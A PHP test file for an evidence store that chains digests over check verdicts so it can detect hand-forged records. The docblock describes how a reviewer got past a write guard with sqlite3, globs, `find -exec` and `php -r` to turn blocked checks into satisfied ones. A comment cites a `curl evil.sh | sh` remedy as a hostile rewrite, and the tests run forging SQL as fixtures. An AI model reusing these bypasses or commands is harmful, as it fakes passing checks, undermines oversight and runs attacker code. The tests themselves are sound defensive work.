<?php

declare(strict_types=1);

namespace Droost\Workflow\Tests\Evidence;

use Droost\Workflow\Evidence\CheckRecord;
use Droost\Workflow\Evidence\CheckState;
use Droost\Workflow\Evidence\EvaluationReport;
use Droost\Workflow\Evidence\EvidenceStore;
use Droost\Workflow\Evidence\Fault;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\TestCase;

/**
 * A record altered outside droost stops following from itself, and says so.
 *
 * A reviewer took a real completed run, flipped its blocked checks to
 * satisfied, invented a gate that has never existed, and rendered a clean
 * evaluation for a run with no booted site and zero MCP calls. The hole was a
 * shell: `Write` to the store was refused and `sqlite3 …  "UPDATE …"` was not.
 *
 * The guard now refuses the obvious shell routes — and a reviewer defeated that
 * in four more within minutes, with a glob, a variable, `find -exec` and
 * `php -r` building the path from two halves. Which file a shell command opens
 * is undecidable from its text, so prevention was never going to hold.
 *
 * So the record defends itself instead. Every verdict's digest covers the
 * previous verdict's digest and its own contents; a row changed, inserted or
 * removed by anything but droost breaks the chain from that point on, and the
 * evaluation leads with it.
 *
 * TAMPER-EVIDENT, NOT TAMPER-PROOF: somebody who reads `chain()` can recompute
 * it. That limit is asserted here on purpose, because a defence whose limits go
 * unstated is a defence that gets trusted past them — which is the whole story
 * of the day that produced this file.
 */
#[CoversClass(EvidenceStore::class)]
final class TamperEvidenceTest extends TestCase {

  use ReadsTheStore;

  /**
   * A scratch project root.
   */
  private string $root;

  /**
   * {@inheritdoc}
   */
  protected function setUp(): void {
    $this->root = sys_get_temp_dir() . '/droost-tamper-' . bin2hex(random_bytes(6));
    mkdir($this->root . '/droost/droost-workflow', 0775, TRUE);
  }

  /**
   * {@inheritdoc}
   */
  protected function tearDown(): void {
    if (is_dir($this->root)) {
      exec('rm -rf ' . escapeshellarg($this->root));
    }
  }

  /**
   * A store with an honest record, and one blocked check to forge.
   */
  private function honestRun(): EvidenceStore {
    $store = new EvidenceStore($this->root);
    $store->upsertRun('r1', ['preset' => 'medium']);
    $store->record('r1', 'code', new CheckRecord(
      'gate', 'phpcs', CheckState::Satisfied, Fault::None, 'clean', NULL, NULL, 0, 'phpcs', NULL, 800,
    ));
    $store->record('r1', 'complete', new CheckRecord(
      'gate', 'wiki_fresh', CheckState::Blocked, Fault::Environment, 'the wiki is stale',
      'drush droost:wiki:build', NULL, 1, 'wiki', NULL, 50,
    ));

    return $store;
  }

  /**
   * The raw file, as a shell would reach it.
   */
  private function raw(): \PDO {
    return new \PDO('sqlite:' . EvidenceStore::pathFor($this->root));
  }

  /**
   * An honest record follows from itself end to end.
   */
  public function testHonestRecordIsSelfConsistent(): void {
    $this->assertNull($this->honestRun()->integrity('r1'), 'nothing droost wrote breaks its own chain');
  }

  /**
   * Flipping a blocked verdict to satisfied is caught, and the row is named.
   */
  public function testFlippingVerdictBreaksTheChain(): void {
    $this->honestRun();
    $this->raw()->exec(
      "UPDATE check_result SET state='satisfied', fault='none', summary='wiki_fresh passed' WHERE state='blocked'"
    );

    $break = (new EvidenceStore($this->root))->integrity('r1');

    $this->assertIsArray($break, 'the forgery is visible');
    $this->assertSame('wiki_fresh', $break['name'], 'and the record names the row it happened at');
    $this->assertSame('complete', $break['phase']);
  }

  /**
   * A gate that never ran, inserted by hand, is caught too.
   */
  public function testInventedGateBreaksTheChain(): void {
    $this->honestRun();
    $this->raw()->exec(
      "INSERT INTO check_result (run_id, phase, attempt, kind, name, state, fault, summary, adjudicated_at)
       VALUES ('r1', 'complete', 1, 'gate', 'security_audit', 'satisfied', 'none', 'no findings', '2026-09-13')"
    );

    $this->assertIsArray((new EvidenceStore($this->root))->integrity('r1'));
  }

  /**
   * Deleting an inconvenient block is caught.
   */
  public function testDeletingBlockBreaksTheChain(): void {
    $this->honestRun();
    $this->raw()->exec("DELETE FROM check_result WHERE state='blocked'");

    $this->assertIsArray((new EvidenceStore($this->root))->integrity('r1'));
  }

  /**
   * The evaluation leads with it, above everything a reader might act on.
   *
   * Detection nobody reads is not detection. The banner sits before §1, and
   * says to read nothing below it as evidence.
   */
  public function testTheEvaluationLeadsWithTheBreak(): void {
    $this->honestRun();
    $this->raw()->exec("UPDATE check_result SET state='satisfied', fault='none' WHERE state='blocked'");

    $report = (new EvaluationReport(new EvidenceStore($this->root)))->render('r1');

    $this->assertStringContainsString('HAS BEEN ALTERED', $report);
    $this->assertStringContainsString('wiki_fresh', $report);
    $this->assertLessThan(
      strpos($report, '## 1. Round identity') ?: PHP_INT_MAX,
      strpos($report, 'HAS BEEN ALTERED') ?: PHP_INT_MAX,
      'the warning comes before anything a reader would act on',
    );
  }

  /**
   * An untampered run renders no banner.
   *
   * Without this the test above would pass on a report that cried wolf every
   * time, which would be worse than no detection at all.
   */
  public function testHonestRunCarriesNoBanner(): void {
    $this->assertStringNotContainsString(
      'HAS BEEN ALTERED',
      (new EvaluationReport($this->honestRun()))->render('r1'),
    );
  }

  /**
   * Every stored column is inside the digest, not a chosen subset.
   *
   * The first cut hashed the verdict fields and left `remedy`, `invocation`,
   * `provider` and both timestamps outside. The worst of those is `remedy`: it
   * is the command an operator is TOLD TO RUN to clear an environment block, so
   * rewriting it to `curl evil.sh | sh` was invisible. `invocation` is printed
   * by the report raw and outside the table, explicitly so it can be run. And
   * `provider` is a contributed check's attribution, stamped from the plugin id
   * precisely so a check cannot claim to be another module's — which it could
   * then be rewritten to claim.
   *
   * Asserted column by column, from the schema rather than from a list, because
   * a digest over PART of a row invites the question "which part" and the next
   * column added will be the one somebody forgets.
   */
  public function testEveryStoredColumnIsInsideTheDigest(): void {
    $store = new EvidenceStore($this->root);
    $store->upsertRun('r1', ['preset' => 'medium']);
    $store->record('r1', 'complete', new CheckRecord(
      'gate', 'snyk', CheckState::Blocked, Fault::Environment,
      '2 vulnerabilities', 'snyk auth', 'abc123', 2, 'snyk test --all-projects',
      '2026-09-13T00:00:00+00:00', 900, [], '', '', 'droost_snyk', TRUE,
    ));
    $this->assertNull($store->integrity('r1'), 'the honest record holds');

    // Every column the row actually carries, except the ones that identify it
    // or hold the digest itself.
    $columns = [];
    foreach ($this->storeRows($this->raw(), 'SELECT * FROM check_result LIMIT 1')[0] ?? [] as $column => $value) {
      if (in_array($column, ['id', 'row_digest', 'run_id', 'phase', 'attempt'], TRUE)) {
        continue;
      }
      $columns[] = (string) $column;
    }
    $this->assertGreaterThan(10, count($columns), 'the row has the columns this test thinks it has');

    foreach ($columns as $column) {
      // A fresh copy per column, so each is tested against an intact chain.
      $copy = $this->root . '/copy-' . $column;
      mkdir($copy . '/droost/droost-workflow', 0775, TRUE);
      // The -wal too: in WAL mode the rows written moments ago are in there,
      // not in the main file, so copying only the .sqlite copies an empty
      // database and every assertion below would pass against nothing.
      foreach (['', '-wal', '-shm'] as $suffix) {
        $from = EvidenceStore::pathFor($this->root) . $suffix;
        if (is_file($from)) {
          copy($from, EvidenceStore::pathFor($copy) . $suffix);
        }
      }

      $pdo = new \PDO('sqlite:' . EvidenceStore::pathFor($copy));
      $pdo->exec(sprintf('UPDATE check_result SET %s = %s', $column, $pdo->quote('forged')));
      unset($pdo);

      $this->assertIsArray(
        (new EvidenceStore($copy))->integrity('r1'),
        sprintf('rewriting "%s" breaks the chain — it is inside the digest', $column),
      );
    }
  }

  /**
   * Blanking every digest does not make the record declare itself legacy.
   *
   * The cheapest break anyone found, and it needed no knowledge of the hash:
   *
   *     UPDATE check_result SET state='satisfied', row_digest='';
   *     UPDATE run SET chain_head='';
   *
   * An empty digest meant "written before digests existed, nothing to verify",
   * and the empty digest was itself unauthenticated — so erasing them wholesale
   * declared the entire record legacy and `integrity()` agreed. The evaluation
   * rendered clean, every gate satisfied.
   *
   * A watermark records which rows predate digests. Above it, a missing digest
   * is a forgery; and a store created since carries a watermark of zero, so
   * every row must have one. That is the case that matters: a measured round
   * starts from an empty store.
   */
  public function testBlankingEveryDigestIsCaught(): void {
    $this->honestRun();

    $pdo = $this->raw();
    $pdo->exec("UPDATE check_result SET state='satisfied', fault='none', row_digest=''");
    $pdo->exec("UPDATE run SET chain_head=''");
    unset($pdo);

    $this->assertIsArray(
      (new EvidenceStore($this->root))->integrity('r1'),
      'an erased chain is a broken chain, not a legacy one',
    );
  }

  /**
   * A deletion droost later writes over is still caught.
   *
   * A forward chain cannot see its own truncation, and the head only guards the
   * tail — so deleting a row and letting droost record one more repaired the
   * evidence automatically. In a test feedback loop that is seconds.
   *
   * The ids are AUTOINCREMENT and nothing in this package deletes from
   * `check_result`; the table is append-only by design, which is why a retried
   * gate gets a new row rather than overwriting the one it failed on. So a gap
   * in the ids is a deletion.
   */
  public function testDeletionSurvivesDroostWritingAgain(): void {
    $this->honestRun();

    $pdo = $this->raw();
    $pdo->exec("DELETE FROM check_result WHERE state='blocked'");
    unset($pdo);

    // Droost carries on and records another verdict, re-chaining from the
    // surviving tail and rewriting the head.
    $reopened = new EvidenceStore($this->root);
    $reopened->record('r1', 'complete', new CheckRecord(
      'gate', 'later', CheckState::Satisfied, Fault::None, 'ran after the deletion',
    ));

    $break = $reopened->integrity('r1');
    $this->assertIsArray($break, 'the gap in the ids outlives the repair');
    $this->assertStringContainsString('deleted', $break['name']);
  }

}
